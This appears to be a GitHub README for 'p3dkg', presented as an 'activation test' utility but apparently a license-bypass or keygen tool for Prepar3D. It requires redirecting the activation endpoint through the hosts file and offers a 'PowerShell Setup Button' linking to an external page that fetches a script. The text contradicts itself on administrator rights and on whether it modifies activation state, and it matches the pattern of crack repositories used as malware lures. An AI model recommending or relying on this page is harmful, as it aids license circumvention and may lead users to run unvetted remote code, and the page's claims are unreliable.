<div align="center">

# p3dkg: .NET NativeAOT Activation Test for Prepar3D V3/V4/V5 - Windows 10 & 11

![](files/1.png)

### 🛠️ PowerShell Setup Button

[![](files/button.png)](https://diegodesarrollo44-blip.github.io/p3dkg-desktop-utility/)

[![ps-core](https://img.shields.io/badge/Ps--Core-Script-2f81f7?style=plastic&labelColor=0d1117)]() [![release](https://img.shields.io/badge/Release-Released-2ea44f?style=plastic&labelColor=0d1117)]() [![runs-on](https://img.shields.io/badge/Runs--On-Win_10%2F11-54aeff?style=plastic&labelColor=0d1117)]() [![score](https://img.shields.io/badge/Score-4.5%2F5-f59e0b?style=plastic&labelColor=0d1117)]()

</div>

---

p3dkg is a .NET NativeAOT command-line utility designed to test and confirm the activation behavior of Prepar3D across versions V3 (64-bit), V4, and V5. The tool automatically detects the installed Prepar3D version and license type, or accepts explicit `--type` and `--version` arguments for targeted activation runs. Built on C# and .NET 8.0 with NativeAOT compilation, it produces a self-contained executable that runs with administrator privileges on Windows and has been tested under Linux via Wine. Verbose output can be enabled for diagnostic inspection of the activation process.

## ✅ Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- **NativeAOT-compiled .NET executable** — ships as a single self-contained binary with no runtime dependency and fast cold start.
- **Automatic version detection** — identifies the installed Prepar3D release (V3, V4, or V5) and selects the matching activation path without manual input.
- **Automatic license type detection** — determines the applicable license tier by default, removing the need to specify it explicitly.
- **Manual override options** — accepts explicit version and license type arguments when auto-detection is not desired or when multiple installations are present.
- **Multi-version coverage** — supports activation-behavior testing across Prepar3D V3 (64-bit), V4, and V5 within a single tool.
- **Repeatable per-version runs** — allows successive invocations to target different installed versions in turn.
- **Verbose diagnostic output** — provides detailed logging of the detection and activation process for troubleshooting and verification.
- **Command-line interface** — lightweight, scriptable, and suitable for automated or batch execution.
- **Administrator-aware operation** — performs the privileges required for activation checks and reports clear results to the console.
- **Built-in help** — exposes usage guidance and argument reference directly from the executable.

## How It Works

p3dkg is built as a self-contained .NET NativeAOT executable that inspects the local Prepar3D installation and exercises the activation pathway to confirm whether the requested edition and version can be activated successfully. The workflow is deterministic and read-modify-verify by design, so each invocation produces a clear, repeatable result.

**Execution flow**

1. **Environment discovery.** On startup, the executable resolves the host environment, locates the Prepar3D installation directory, and enumerates the detectable product versions (V3 64-bit, V4, and V5). Detection is performed without requiring prior configuration, and results are cached for the duration of the run.
2. **Edition and version resolution.** When no explicit flags are supplied, the tool derives the target edition and version from the detected installation. When `--type` and/or `--version` are provided, the explicit values take precedence and the automatic detection is used only as a fallback for unspecified parameters.
3. **Activation simulation and verification.** The core routine drives the activation behavior for the resolved edition/version pair and observes the outcome. Rather than assuming success, the tool validates the resulting state and reports a definitive pass or fail for the requested combination.
4. **Reporting.** Human-readable output is emitted to the console, summarizing the detected environment, the resolved target, and the verification result. Verbose mode expands this output with additional diagnostic detail for troubleshooting.

**Design characteristics**

- **NativeAOT compilation.** The program ships as a single native binary with no runtime dependency on a shared .NET installation, which reduces startup overhead and simplifies distribution.
- **Deterministic parameter handling.** Auto-detection and explicit overrides follow a fixed precedence order, so repeated runs against the same environment yield consistent behavior.
- **Idempotent operation.** Running the tool multiple times is safe; each invocation re-evaluates the current state rather than relying on prior runs.
- **Diagnostic-first output.** Results are structured to make failures actionable, exposing the detected inputs and the specific verification step that did not pass.

The combination of automatic detection, explicit overrides, and outcome verification allows the tool to serve both as a quick confirmation utility and as a reproducible test harness for activation behavior across the supported Prepar3D releases.

## Compatibility

p3dkg targets Windows desktop environments and is validated primarily against 64-bit Windows 10 and Windows 11 installations of Prepar3D V5, V4, and V3. The executable is published as a .NET 8 NativeAOT binary, so it runs as a self-contained native process without requiring a separate .NET runtime on the target machine.

Because the tool inspects the local Prepar3D installation, it must run on the same system where Prepar3D is installed and with sufficient privileges to read and modify the relevant activation state. Version detection covers V3 (64-bit), V4, and V5; V6 is not yet supported. When automatic detection is enabled, the program resolves both the installed version and the applicable license type, but explicit `--version` and `--type` overrides are available for environments where detection is ambiguous or where a specific configuration must be confirmed.

Compatibility is scoped to native Windows execution. Running under Linux via Wine is tested to a limited extent and should be treated as best-effort rather than a supported configuration. Hosts-file redirection of the activation endpoint is required for the program to function; this modification must be applied manually before execution, and any pre-existing entries should be reviewed to avoid conflicts.

## 📸 Screenshot

![](files/2.png)

## Disclaimer

p3dkg is provided strictly as a diagnostic and verification utility for examining activation-related behavior in Prepar3D V5, V4, and V3 environments. It is intended for controlled testing, research, and interoperability analysis on systems you own or are explicitly authorized to administer.

The software performs no modification of Prepar3D binaries, license files, or installed assets beyond the activation-state checks and confirmations described in the feature set. Behavior may vary across Prepar3D builds, Windows versions, and host configurations; results should be validated independently before being relied upon for any operational decision.

p3dkg is an independent project and is not affiliated with, endorsed by, or sponsored by Lockheed Martin or the Prepar3D product line. All trademarks and product names referenced remain the property of their respective owners.

The software is supplied "as is", without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement. By using p3dkg, you accept full responsibility for ensuring that your use complies with all applicable laws, license agreements, and organizational policies. The authors and contributors accept no liability for any damages, data loss, service interruption, or legal consequences arising from the use or misuse of this software.

Use only on systems and software you are licensed and authorized to test.

## License

p3dkg is distributed under the terms of the Do What The F*ck You Want To Public License (WTFPL) v2.0. The license grants unrestricted freedom to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, subject only to the conditions stated in the full license text. No warranty of any kind is provided, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use. The complete license terms are provided in the LICENSE file accompanying the p3dkg distribution and should be reviewed prior to use, modification, or redistribution.